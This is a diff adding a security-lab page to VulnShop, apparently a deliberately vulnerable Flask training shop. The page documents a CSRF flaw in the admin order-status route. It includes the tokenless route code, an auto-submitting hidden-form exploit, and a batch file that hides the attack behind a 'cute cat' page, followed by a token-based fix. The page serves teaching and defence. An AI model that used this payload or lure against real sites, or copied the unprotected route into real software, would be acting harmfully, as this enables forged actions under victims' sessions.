@@ -1,0 +1,363 @@
+{% extends 'admin/base.html' %}
+
+{% block content %}
+
+<div class="container-fluid">
+
+    <h1 class="h3 mb-4 text-gray-800">
+        Cross-Site Request Forgery (CSRF)
+    </h1>
+
+    <div class="alert alert-warning">
+        <strong>Security Lab:</strong>
+        This page documents an intentionally implemented CSRF vulnerability in VulnShop
+        for educational and demonstration purposes.
+    </div>
+
+    <div class="card shadow mb-4">
+
+        <div class="card-header py-3">
+            <h6 class="m-0 font-weight-bold text-danger">
+                1. CSRF - Unauthorized Order Status Change
+            </h6>
+        </div>
+
+        <div class="card-body">
+
+            <h5>Description</h5>
+            <p>
+                Cross-Site Request Forgery occurs when an attacker tricks an authenticated
+                user into sending an unwanted request to a web application.
+            </p>
+
+            <p>
+                In this vulnerability, an administrator can be tricked into opening a malicious
+                page that silently sends a request to change the status of an order.
+            </p>
+
+            <h5>Affected Endpoint</h5>
+            <pre><code>POST /admin/orders/&lt;order_id&gt;/status</code></pre>
+
+            <h5>Affected Route</h5>
+            <pre><code>src/routes/order_routes.py</code></pre>
+
+            <h5>Affected Template</h5>
+            <pre><code>templates/admin/orders/order_detail.html</code></pre>
+
+            <h5>Affected Model / Service</h5>
+            <pre><code>
+src/models/order.py
+src/services/order_service.py
+            </code></pre>
+
+            <h5>Vulnerable Code</h5>
+            <pre><code>
+@admin_order_bp.route("/&lt;int:order_id&gt;/status", methods=["POST"])
+def update_status(order_id):
+
+    if "user_id" not in session:
+        flash("Please login first.", "warning")
+        return redirect(url_for("login.login_page"))
+
+    if session.get("role") != "Admin":
+        flash("Access denied.", "danger")
+        return redirect(url_for("home.home_page"))
+
+    status = request.form.get("status")
+
+    # VULNERABILITY:
+    # The application updates the order status without checking
+    # whether the POST request contains a valid CSRF token.
+    change_order_status(order_id, status)
+
+    flash("Order status updated successfully.", "success")
+
+    return redirect(url_for("admin_order.admin_order_detail", order_id=order_id))
+            </code></pre>
+
+            <p>
+                The application verifies authentication and authorization, but it does not verify
+                whether the request was intentionally submitted from the legitimate admin form.
+            </p>
+
+            <h5>Cross-Site Attack Architecture</h5>
+
+            <pre><code>
+Legitimate VulnShop application:
+http://127.0.0.1:5000
+
+Malicious attacker page:
+http://127.0.0.1:8000/csrf_exploit.html
+
+Flow:
+Admin Browser
+    |
+    | opens malicious cute cat page
+    v
+http://127.0.0.1:8000/csrf_exploit.html
+    |
+    | hidden POST request with Admin session cookie
+    v
+http://127.0.0.1:5000/admin/orders/18/status
+            </code></pre>
+
+            <h5>Manual Exploitation Scenario</h5>
+
+            <pre><code>
+1. The administrator logs into VulnShop:
+
+   http://127.0.0.1:5000/admin/dashboard
+
+2. The attacker prepares two files:
+
+   cute_cat.bat
+   csrf_exploit.html
+
+3. The attacker convinces the administrator to open cute_cat.bat.
+
+4. The batch file starts a local attacker server on:
+
+   http://127.0.0.1:8000
+
+5. The browser opens:
+
+   http://127.0.0.1:8000/csrf_exploit.html
+
+6. The administrator only sees a harmless cat picture.
+
+7. In the background, the malicious HTML page submits:
+
+   POST /admin/orders/18/status
+   status=Paid
+
+8. The browser automatically includes the active Admin session cookie.
+
+9. VulnShop accepts the request and changes the order status.
+            </code></pre>
+
+            <h5>Expected Vulnerable Result</h5>
+            <p>
+                If Order #18 changes its status without the administrator clicking the real
+                "Update Status" button inside VulnShop, the CSRF vulnerability is successfully exploited.
+            </p>
+
+            <h5>Exploit HTML Code</h5>
+
+            <pre><code>
+&lt;form
+    id="csrfForm"
+    method="POST"
+    target="hiddenFrame"
+    action="http://127.0.0.1:5000/admin/orders/18/status"&gt;
+
+    &lt;input type="hidden" name="status" value="Paid"&gt;
+
+&lt;/form&gt;
+
+&lt;script&gt;
+    document.getElementById("csrfForm").submit();
+&lt;/script&gt;
+            </code></pre>
+
+            <h5>Batch File Used for the Demo</h5>
+
+            <pre><code>
+@echo off
+cd /d "%~dp0"
+
+start "" http://127.0.0.1:8000/csrf_exploit.html
+
+python -m http.server 8000
+
+pause
+            </code></pre>
+
+            <p>
+                The batch file changes into the exploit folder, opens the malicious HTML page
+                in the browser, and starts a local HTTP server on port 8000. This makes the
+                attacker page behave like a separate website.
+            </p>
+
+            <h5>Impact</h5>
+            <ul>
+                <li>Unauthorized order status modification</li>
+                <li>Abuse of an authenticated administrator session</li>
+                <li>Execution of sensitive actions without user consent</li>
+                <li>Loss of integrity in order management</li>
+                <li>Possible business logic manipulation</li>
+            </ul>
+
+            <h5>Mitigation</h5>
+            <p>
+                Sensitive state-changing requests must include a CSRF token that is generated
+                by the server and verified on every POST request.
+            </p>
+
+            <pre><code>
+import secrets
+from flask import abort
+
+@admin_order_bp.route("/&lt;int:order_id&gt;")
+def admin_order_detail(order_id):
+
+    session["csrf_token"] = secrets.token_hex(32)
+
+    order, items = get_order_details(order_id)
+
+    return render_template(
+        "admin/orders/order_detail.html",
+        order=order,
+        items=items
+    )
+
+
+@admin_order_bp.route("/&lt;int:order_id&gt;/status", methods=["POST"])
+def update_status(order_id):
+
+    if "user_id" not in session:
+        flash("Please login first.", "warning")
+        return redirect(url_for("login.login_page"))
+
+    if session.get("role") != "Admin":
+        flash("Access denied.", "danger")
+        return redirect(url_for("home.home_page"))
+
+    submitted_token = request.form.get("csrf_token")
+    session_token = session.get("csrf_token")
+
+    if not submitted_token or submitted_token != session_token:
+        abort(403)
+
+    status = request.form.get("status")
+
+    change_order_status(order_id, status)
+
+    flash("Order status updated successfully.", "success")
+
+    return redirect(url_for("admin_order.admin_order_detail", order_id=order_id))
+            </code></pre>
+
+            <h5>Secure Form Example</h5>
+
+            <pre><code>
+&lt;form method="POST"
+      action="&#123;&#123; url_for('admin_order.update_status', order_id=order.id) &#125;&#125;"&gt;
+
+    &lt;input type="hidden"
+           name="csrf_token"
+           value="&#123;&#123; session['csrf_token'] &#125;&#125;"&gt;
+
+    ...
+&lt;/form&gt;
+</code></pre>
+
+            <h5>Files Involved</h5>
+
+            <table class="table table-bordered">
+                <thead class="thead-light">
+                    <tr>
+                        <th>File</th>
+                        <th>Purpose</th>
+                    </tr>
+                </thead>
+
+                <tbody>
+                    <tr>
+                        <td>src/routes/order_routes.py</td>
+                        <td>Receives the vulnerable POST request and updates the order status.</td>
+                    </tr>
+
+                    <tr>
+                        <td>templates/admin/orders/order_detail.html</td>
+                        <td>Contains the legitimate Admin form used to update an order status.</td>
+                    </tr>
+
+                    <tr>
+                        <td>src/services/order_service.py</td>
+                        <td>Calls the model function that updates the order status.</td>
+                    </tr>
+
+                    <tr>
+                        <td>src/models/order.py</td>
+                        <td>Executes the SQL UPDATE query on the <code>orders</code> table.</td>
+                    </tr>
+
+                    <tr>
+                        <td>exploits/csrf_exploit.html</td>
+                        <td>Malicious HTML page that automatically submits the hidden POST request.</td>
+                    </tr>
+
+                    <tr>
+                        <td>exploits/cute_cat.bat</td>
+                        <td>Starts the local attacker server and opens the malicious HTML page.</td>
+                    </tr>
+
+                    <tr>
+                        <td>templates/admin/security_lab/csrf.html</td>
+                        <td>This file. It documents the CSRF vulnerability and its mitigation.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h5>Automated Exploit Demonstration</h5>
+
+            <p>
+                The exploit demonstration uses a harmless-looking cat page to hide the malicious
+                request from the administrator. The administrator sees only the fake content,
+                while the order status is changed in the background.
+            </p>
+
+            <h6>Exploit Files</h6>
+
+            <pre><code>
+exploits/cute_cat.bat
+exploits/csrf_exploit.html
+            </code></pre>
+
+            <h6>Execution Command</h6>
+
+            <pre><code>
+cd exploits
+.\cute_cat.bat
+            </code></pre>
+
+            <h6>What the Exploit Does</h6>
+
+            <ul>
+                <li>Starts a local attacker-controlled server on port 8000.</li>
+                <li>Opens the malicious page <code>csrf_exploit.html</code>.</li>
+                <li>Displays a harmless cat picture to the administrator.</li>
+                <li>Submits a hidden POST request to VulnShop on port 5000.</li>
+                <li>Uses the administrator's active session cookie automatically.</li>
+                <li>Changes Order #18 status to <code>Paid</code>.</li>
+            </ul>
+
+            <h6>Target Endpoint</h6>
+
+            <pre><code>
+POST http://127.0.0.1:5000/admin/orders/18/status
+            </code></pre>
+
+            <h6>Expected Result</h6>
+
+            <p>
+                After the administrator opens the malicious file, the browser displays only a
+                cat picture. In the background, the following request is sent:
+            </p>
+
+            <pre><code>
+POST /admin/orders/18/status
+status=Paid
+            </code></pre>
+
+            <p>
+                If the order status changes to <code>Paid</code> without the administrator
+                manually using the VulnShop status form, the CSRF attack is confirmed.
+            </p>
+
+        </div>
+    </div>
+
+</div>
+
+{% endblock %}
